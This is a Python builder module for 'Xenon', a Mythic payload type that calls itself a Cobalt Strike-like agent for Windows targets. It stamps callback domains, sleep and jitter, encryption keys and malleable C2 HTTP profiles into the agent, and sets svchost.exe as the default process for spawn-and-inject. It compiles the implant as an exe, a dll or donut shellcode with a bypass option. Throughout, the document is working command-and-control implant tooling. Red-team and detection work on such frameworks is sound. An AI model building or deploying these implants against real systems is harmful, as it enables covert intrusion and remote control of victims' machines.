import logging, json, toml
import traceback
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from distutils.dir_util import copy_tree
import asyncio, os, tempfile, base64
from .utils.agent_global_settings import PROCESS_INJECT_KIT
import os

import donut

from ..utils.packer import serialize_int, serialize_bool, serialize_string, generate_raw_c2_transform_definitions

class XenonAgent(PayloadType):
    name = "xenon"
    file_extension = "exe"
    author = "@c0rnbread"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.2"""
    supports_dynamic_loading = True
    c2_profiles = ["httpx"]
    mythic_encrypts = True
    translation_container = "XenonTranslator"
    build_parameters = [
        BuildParameter(
            name = "output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=[ "exe", "dll", "shellcode"],
            default_value="exe",
            description="Output type: shellcode, dynamic link library, executable",
        ),
        BuildParameter(
            name = "debug",
            parameter_type=BuildParameterType.Boolean,
            default_value="false",
            description="Debug: Includes debugging console and symbols in agent. Don't use for real",
        ),
        BuildParameter(
            name = "dll_export_function",
            parameter_type=BuildParameterType.String,
            default_value="DllRegisterServer",
            description="Dll Export Function: The name of the exported function when using the DLL payload type. (e.g., rundll32.exe xenon.dll,MyExportFunction)",
        ),
        BuildParameter(
            name = "spawnto_process",
            parameter_type=BuildParameterType.String,
            default_value="svchost.exe",
            description="Spawnto Process: Process name to use for spawn & inject commands.",
        ),
        BuildParameter(
            name = "default_pipename",
            parameter_type=BuildParameterType.String,
            default_value="xenon",
            description="Default Pipe Name: String to use for named pipes.",
        )
        
    ]
    agent_path = pathlib.Path(".") / "xenon" / "mythic"
    # agent_icon_path = agent_path / "agent_functions" / "xenon_agent.svg"
    agent_icon_path = agent_path / "agent_functions" / "v1-transparent.png"
    agent_code_path = pathlib.Path(".") / "xenon" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
        BuildStep(step_name="Installing Modules", step_description="Compile and include necessary BOFs"),
        BuildStep(step_name="Compiling", step_description="Compiling with Mingw-w64")

    ]

    # Build the actual agent payload
    async def build(self) -> BuildResponse:

        logging.basicConfig(level=logging.INFO)
        
        # This function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        
        ######################################
        ####### Set up agent config  #########
        ######################################

        Config = {
            "payload_uuid": self.uuid,
            # httpx settings
            "callback_domains": [],
            "domain_rotation": "fail-over",
            "callback_interval": 10,
            "killdate": "",
            "failover_threshold": 5,
            "callback_jitter": 23,
            "encryption": False,
            "aes_key": "",
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
        }
        stdout_err = ""
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            # Set each key value from HTTP profile in Config dictionary
            for key, val in c2.get_parameters_dict().items():
                # Check for encryption
                if isinstance(val, dict) and 'enc_key' in val:  # enc_key is base64(value)
                    if val['enc_key'] == None:
                        Config['encryption'] = False
                    else:
                        Config['encryption'] = True
                        Config['aes_key'] = val['enc_key']
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                
                # Check for httpx config file
                elif (key == 'raw_c2_config'):
                    agentConfigFileId = val
                    
                    try:
                        # Read configuration file contents
                        response = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(agentConfigFileId))
                        
                        if (response.Success != True):
                            resp.set_status(BuildStatus.Error)
                            resp.build_stderr = "Key error: " + key + "\n" + configData.Error
                            resp.build_stderr += "\n" + traceback.format_exc()
                            return resp # early return
                        
                        raw_config_file_data = response.Content.decode('utf-8')
                        
                        logging.info(f"Found Agent config")
                        
                        # Try parsing the content as JSON
                        try:
                            toml_config = json.loads(raw_config_file_data)
                        except json.JSONDecodeError:
                            logging.info(f"raw_c2_config doesn't appear to be JSON")
                            # If JSON fails, try parsing as TOML
                            try:
                                toml_config = toml.loads(raw_config_file_data)
                            except toml.TomlDecodeError as err:
                                logging.info(f"TOML parsing failed: {err}")
                                raise Exception(f"TOML parsing failed: {err}")

                        logging.info(f"Successfully parsed Agent config JSON/TOML!")
                        # If successful, add the parsed config to Configuration dict
                        Config[key] = toml_config
                    except Exception as err:
                        # Handle the error by updating the response
                        resp.set_status(BuildStatus.Error)
                        resp.build_stderr = f"Key error: {key}\n{str(err)}"
                        resp.build_stderr += "\n" + traceback.format_exc()
                        return resp # early return
                    
                    
                # Handle all other values in configuration
                else:
                    Config[key] = val
            break
        
        
        if Config["proxy_host"] != "":
            Config["proxyEnabled"] = True

        # Alert: Gathering Files
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
        ))

        agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
        copy_tree(str(self.agent_code_path), agent_build_path.name)


        ###############################
        ### Compile Postex named pipe stub ####
        ###############################
        
        # CWD - Xenon/Payload_Type/xenon/
        stub_dir = 'xenon/agent_code/stub'
        
        postex_pipename = self.get_parameter('default_pipename')
        cmd_stub = f"make PIPENAME={postex_pipename}"
        proc = await asyncio.create_subprocess_shell(cmd_stub, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=stub_dir)
        stdout, stderr = await proc.communicate()
        if proc.returncode != 0:
            build_success = False
            logging.error(f"Command failed with exit code {proc.returncode}")
            logging.error(f"[stderr]: {stderr.decode()}")
            raise Exception(cmd_stub)
        else:
            logging.info(f"[stdout]: {stdout.decode()}")
        
        
        ###############################
        ### Initialize BOF Modules ####
        ###############################
        
        CORE_MODULE_PATH = pathlib.Path(".") / "xenon" / "agent_code" / "modules" / "core"
        # Add Core Modules 
        bof_filename = "inline-ea.x64.o"
        bof_path = CORE_MODULE_PATH / "inline-ea" / bof_filename
    
        if not bof_path.exists():
            logging.error(f"BOF file not found: {bof_path}")

        try:
            with open(bof_path, "rb") as f:
                bof_bytes = f.read()

            # Upload BOF to Mythic 
            file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(
                    PayloadUUID=self.uuid,
                    Filename=bof_filename,
                    DeleteAfterFetch=False,
                    FileContents=bof_bytes
                )
            )

            if file_resp.Success:
                logging.info(f"Successfully uploaded: {bof_filename}")
            else:
                raise Exception(f"Failed to upload {bof_filename}: {file_resp.Error}")

        except Exception as e:
            logging.exception(f"Error uploading {bof_filename}: {str(e)}")


        # Add Situational Awareness BOFs to Mythic. (e.g., sa_<cmd>)
        SA_MODULE_PATH = pathlib.Path(".") / "xenon" / "agent_code" / "modules" / "trustedsec_bofs"        
        for cmd in self.commands.get_commands():
            if cmd.startswith("sa_"):
                bof_stem = cmd[3:]  # Strip 'sa_' prefix
                bof_filename = f"{bof_stem}.x64.o"
                bof_path = SA_MODULE_PATH / bof_stem / bof_filename

                if not bof_path.exists():
                    logging.error(f"BOF file not found: {bof_path}")
                    continue

                try:
                    with open(bof_path, "rb") as f:
                        bof_bytes = f.read()

                    # Upload BOF to Mythic 
                    file_resp = await SendMythicRPCFileCreate(
                        MythicRPCFileCreateMessage(
                            PayloadUUID=self.uuid,
                            Filename=bof_filename,
                            DeleteAfterFetch=False,
                            FileContents=bof_bytes
                        )
                    )

                    if file_resp.Success:
                        logging.info(f"Successfully uploaded: {bof_filename}")
                    else:
                        raise Exception(f"Failed to upload {bof_filename}: {file_resp.Error}")

                except Exception as e:
                    logging.exception(f"Error uploading {bof_filename}: {str(e)}")

         
         # Notify: Installed Modules
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Installing Modules",
                StepStdout="Installed needed BOF files",
                StepSuccess=True
        ))
         
        ######################################
        #####  Agent instance config (packed)####
        ######################################
        try:
            ''' 
                General Settings ( in [Type, Size, Data] format)
            '''
            
            serialized_data = b""

            # Serialize the payload UUID
            serialized_data += serialize_string(Config["payload_uuid"], pack_size=False)

            # Serialize encryption settings
            serialized_data += serialize_bool(Config["encryption"])
            if Config["encryption"]:
                serialized_data += serialize_string(Config["aes_key"])

            # Serialize proxy settings
            serialized_data += serialize_bool(Config["proxyEnabled"])
            if Config["proxyEnabled"]:
                serialized_data += serialize_string(Config["proxy_host"])
                serialized_data += serialize_string(Config["proxy_user"])
                serialized_data += serialize_string(Config["proxy_pass"])

            # Serialize sleep time and jitter
            serialized_data += serialize_int(Config["callback_interval"])  # Sleep time
            serialized_data += serialize_int(Config["callback_jitter"])    # Jitter
            
            # Serialize domain rotation and failover threshold
            rotation_strategies = {
                "round-robin": 0,
                "fail-over": 1,
                "random": 2
            }
            strategy = Config.get("domain_rotation", "fail-over")
            domain_rotation_value = rotation_strategies.get(strategy)
            serialized_data += serialize_int(domain_rotation_value)
            serialized_data += serialize_int(Config["failover_threshold"])

            # Process Injection Settings
            spawnto_process_path = self.get_parameter('spawnto_process')
            serialized_data += serialize_string(spawnto_process_path)
            # Fork & Run default pipe name
            inject_pipe_name = self.get_parameter('default_pipename')
            serialized_data += serialize_string(inject_pipe_name)

            # Serialize number of hosts (callback domains)
            num_hosts = len(Config["callback_domains"])
            serialized_data += serialize_int(num_hosts)

            # Serialize each callback domain
            for url in Config["callback_domains"]:
                # Parse the URL to get hostname, port, and SSL flag
                if url.startswith("https://"):
                    ssl = True
                    url_without_scheme = url[len("https://"):]
                elif url.startswith("http://"):
                    ssl = False
                    url_without_scheme = url[len("http://"):]
                else:
                    raise ValueError("Invalid URL scheme")

                # Split hostname and port
                hostname, port = url_without_scheme.split(':')
                port = int(port)

                # Serialize hostname, port, and SSL flag
                serialized_data += serialize_string(hostname)
                serialized_data += serialize_int(port)
                serialized_data += serialize_bool(ssl)

            # Convert to hex string format for C macro
            general_config_hex = ''.join(f'\\x{byte:02X}' for byte in serialized_data)

            # Output as C macro
            logging.info(f'#define S_AGENT_CONFIG "{general_config_hex}"')
            
            with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                content = f.read()

                # Stamp in hex byte array
                content = content.replace("%S_AGENT_CONFIG%", general_config_hex)              
                
                # Write the updated content back to the file
                f.seek(0)
                f.write(content)
                f.truncate()
                
            
            ##############################
            #####     User-Agent      ####
            ##############################
            with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                content = f.read()

                # Replace user agent for GET request (if defined, otherwise use default "Xenon")
                get_user_agent = Config["raw_c2_config"]["get"]["client"]["headers"].get("User-Agent", "Xenon")
                content = content.replace("%S_GET_USERAGENT%", get_user_agent)

                # Replace user agent for POST request (if defined, otherwise use default "Xenon")
                post_user_agent = Config["raw_c2_config"]["post"]["client"]["headers"].get("User-Agent", "Xenon")
                content = content.replace("%S_POST_USERAGENT%", post_user_agent)

                
                # Write the updated content back to the file
                f.seek(0)
                f.write(content)
                f.truncate()


            #############################################################################
            #####     HTTP(X) request profiles ( in [Type, Size, Data] format)       ####
            #############################################################################
            
            with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                content = f.read()

                # Generate byte arrays for the malleable C2 profiles
                get_client, post_client, get_server, post_server = generate_raw_c2_transform_definitions(Config["raw_c2_config"])
                
                content = content.replace("%S_C2_GET_CLIENT%", get_client)
                content = content.replace("%S_C2_POST_CLIENT%", post_client)
                content = content.replace("%S_C2_GET_SERVER%", get_server)
                content = content.replace("%S_C2_POST_SERVER%", post_server)
                
                logging.info("Malleable C2 Profiles: \n")
                logging.info(f'#define S_C2_GET_CLIENT "{get_client}"')
                logging.info(f'#define S_C2_POST_CLIENT "{post_client}"')
                logging.info(f'#define S_C2_GET_SERVER "{get_server}"')
                logging.info(f'#define S_C2_POST_SERVER "{post_server}"')
                
                # Write the updated content back to the file
                f.seek(0)
                f.write(content)
                f.truncate()


            ######################################
            #####     Payload Options         ####
            ######################################
            
            # Set DLL export function name
            if self.get_parameter('output_type') == 'dll' or self.get_parameter('output_type') == 'shellcode':
                with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                    content = f.read()    
                    export_function = self.get_parameter('dll_export_function')
                    
                    content = content.replace("%S_DLL_EXPORT_FUNC%", export_function)
                    
                    logging.info(f'#define S_DLL_EXPORT_FUNC {export_function}')

                    # Write the updated content back to the file
                    f.seek(0)
                    f.write(content)
                    f.truncate()

            ######################################
            #####     Included commands       ####
            ######################################
            
            # https://github.com/silentwarble/Hannibal/blob/main/Payload_Type/hannibal/hannibal/mythic/agent_functions/builder.py
            #included_commands = [f"INCLUDE_CMD_{x.upper()}" for x in self.commands.get_commands()]
            included_commands = [f"INCLUDE_CMD_{x.upper()}" for x in self.commands.get_commands() if not x.startswith("sa_")]
            logging.info(f"Operator selected commands: {included_commands}")

            line = ""
            for cmd in included_commands:
                line += f'#define {cmd}\n'

            with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                content = f.read()
                
                content = content.replace("%S_C2_INCLUDED_CMDS%", line)
                
                logging.info(f"Stamping in included commands \n{line}")
                
                # Write the updated content back to the file
                f.seek(0)
                f.write(content)
                f.truncate()

            # Done step
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Applying configuration",
                StepStdout=f"All configuration setting applied.",
                StepSuccess=True
            ))


            ######################################
            #####         Compile agent       ####
            ######################################
            build_success = True
            
            # Clean old files
            clean_cmd = "make clean"
            proc = await asyncio.create_subprocess_shell(clean_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            if proc.returncode != 0:
                build_success = False
                logging.error(f"Command failed with exit code {proc.returncode}")
                logging.error(f"[stderr]: {stderr.decode()}")
                raise Exception("make clean failed")
            else:
                logging.info(f"[stdout]: {stdout.decode()}")
            
            
            # Exe
            if self.get_parameter('output_type') == 'exe':
                if self.get_parameter('debug') == True:
                    command = "make debug_exe"
                    output_path = f"{agent_build_path.name}/artifact_x64-debug.exe"
                else:
                    command = "make exe"
                    output_path = f"{agent_build_path.name}/artifact_x64.exe"
            # Dll or Shellcode
            elif self.get_parameter('output_type') == 'dll' or self.get_parameter('output_type') == 'shellcode':
                if self.get_parameter('debug') == True:
                    command = "make debug_dll"
                    output_path = f"{agent_build_path.name}/artifact_x64-debug.dll"
                else:
                    command = "make dll"
                    output_path = f"{agent_build_path.name}/artifact_x64.dll"
            
            # Make command
            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            stdout_err = ""
            if proc.returncode != 0:
                build_success = False
                logging.error(f"Command failed with exit code {proc.returncode}")
                logging.error(f"[stderr]: {stderr.decode()}")
                stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
            else:
                logging.info(f"[stdout]: {stdout.decode()}")
                stdout_err += f'\n[stdout]\n{stdout.decode()}\n'

                logging.info(f"[+] Compiled agent written to {output_path}")
            
            
            # If shellcode, run donut on the Dll above
            if self.get_parameter('output_type') == 'shellcode':
                bin_file = f"{agent_build_path.name}/loader.bin"
                # Use donut-shellcode here
                donut.create(file=output_path, output=bin_file, arch=3, bypass=1, method=export_function)
   
                if os.path.exists(bin_file):
                    # Shellcode is new output file path
                    output_path = bin_file
                else:
                    # Some error occurred with donut
                    stdout_err += f'[stderr]\nFile not found {bin_file}'
                    build_success = False

                logging.info(f"[+] Converting Dll to shellcode {output_path}")

            # alert: Compiling success
            if build_success:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout="Successfully compiled payload",
                    StepSuccess=True
                ))
                # send back payload file
                resp.payload = open(output_path, 'rb').read()
                resp.build_message = 'Xenon successfully built!'
                resp.status = BuildStatus.Success
                resp.build_stdout = stdout_err
                resp.status = BuildStatus.Success
            # alert: Compiling failed
            else:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=stdout_err,
                    StepSuccess=False
                ))
                # return error messages
                resp.status = BuildStatus.Error
                resp.payload = b""
                resp.build_message = "Unknown error while building payload. Check the stderr for this build."
                resp.build_stderr = stdout_err
            
        # catch errors in above
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
            resp.build_stderr += "\n" + traceback.format_exc()

        return resp

